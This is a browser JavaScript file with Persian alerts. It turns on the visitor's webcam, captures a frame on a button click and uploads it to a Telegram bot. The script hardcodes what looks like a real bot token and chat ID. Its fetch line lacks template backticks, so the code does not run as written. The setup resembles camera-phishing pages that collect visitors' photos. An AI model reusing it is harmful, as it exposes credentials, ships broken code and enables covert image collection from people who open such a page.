const video = document.getElementById('video');
const captureButton = document.getElementById('capture');
const canvas = document.getElementById('canvas');
const photo = document.getElementById('photo');

const telegramBotToken = '8145088190:AAHfRPMjGY8FOP2AYl5kCdOuI43BirE-6Mo';
const chatId = '8058894693';

navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
    })
    .catch(err => {
        alert("دسترسی به دوربین امکان‌پذیر نیست");
    });

captureButton.addEventListener('click', () => {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/png');
    photo.src = dataUrl;

    sendToTelegram(dataUrl);
});

function sendToTelegram(imageData) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', dataURLtoFile(imageData, 'photo.png'));

    fetch(https://api.telegram.org/bot${telegramBotToken}/sendPhoto, {
        method: 'POST',
        body: formData
    }).then(response => response.json())
      .then(data => {
          if (data.ok) {
              alert('عکس با موفقیت ارسال شد!');
          } else {
              alert('مشکلی در ارسال عکس پیش آمد');
          }
      })
      .catch(err => alert('خطا در ارسال عکس'));
}

function dataURLtoFile(dataUrl, filename) {
    const arr = dataUrl.split(','), mime = arr[0].match(/:(.*?);/)[1],
          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--) u8arr[n] = bstr.charCodeAt(n);
    return new File([u8arr], filename, { type: mime });
                   }
